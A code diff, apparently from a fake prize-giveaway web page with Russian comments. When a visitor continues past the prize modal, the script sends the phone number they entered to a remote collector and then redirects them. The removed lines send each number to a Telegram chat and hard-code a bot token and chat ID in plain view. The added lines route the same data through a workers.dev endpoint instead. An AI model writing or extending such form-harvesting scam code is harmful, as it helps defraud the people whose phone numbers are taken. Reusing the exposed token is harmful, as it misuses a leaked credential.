@@ -239,20 +239,14 @@
       prizeModal.classList.remove('hidden');
       prizeModal.classList.add('flex');
 
-const TELEGRAM_BOT_TOKEN = '8401480098:AAEDUGA6oI06DzV7gDw3OqII6AFlmNpv4oE';
-const TELEGRAM_CHAT_ID = '1946463409';
-
     continueBtn.onclick = () => {
     const phone = phoneInput.value;          // введённый номер
     const prize = prizeText.textContent;     // выбранный приз
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      fetch('https://logse.lukasschneid3r.workers.dev/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: `Новый участник:\nНомер: ${phone}\nПриз: ${prize}`
-            })
+        body: JSON.stringify({ phone, prize })
       }).catch(err => console.error(err));
 
    // Редирект на ссылку (пока фиксированная, позже можно менять через бота)
